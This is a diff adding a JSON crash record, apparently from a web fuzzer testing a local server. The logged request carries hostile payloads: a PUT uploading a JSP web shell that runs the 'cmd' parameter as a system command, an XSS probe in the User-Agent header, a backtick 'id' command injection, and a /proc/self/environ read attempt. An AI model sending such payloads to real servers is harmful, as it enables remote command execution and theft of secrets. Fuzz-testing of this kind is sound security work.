@@ -1,0 +1,24 @@
+{
+  "timestamp": "2025-12-29T14:42:22.137093",
+  "crash_type": "server_crash",
+  "payload": "PUT /test.jspx?\nHeaders: {'User-Agent': '<script>alert(1)</script>', 'Accept-Encoding': 'gzip, deflate', 'Accept': '*/*', 'Connection': 'close', 'Host': '127.0.0.1:8080', 'Referer': '@/proc/self/environ', 'X-Rewrite-Url': '` id `', 'Content-Range': 'bytes 0-100/101', 'Content-Length': '59'}\nBody: <%Runtime.getRuntime().exec(request.getParameter(\"cmd\"));%>",
+  "payload_hash": "adf1612a81b94346",
+  "request_method": "PUT",
+  "request_path": "/test.jspx?",
+  "request_headers": {
+    "User-Agent": "<script>alert(1)</script>",
+    "Accept-Encoding": "gzip, deflate",
+    "Accept": "*/*",
+    "Connection": "close",
+    "Host": "127.0.0.1:8080",
+    "Referer": "@/proc/self/environ",
+    "X-Rewrite-Url": "` id `",
+    "Content-Range": "bytes 0-100/101",
+    "Content-Length": "59"
+  },
+  "request_body": "<%Runtime.getRuntime().exec(request.getParameter(\"cmd\"));%>",
+  "error_message": "Simulated server_crash",
+  "stack_trace": null,
+  "fuzzer_variant": null,
+  "iteration": 679
+}
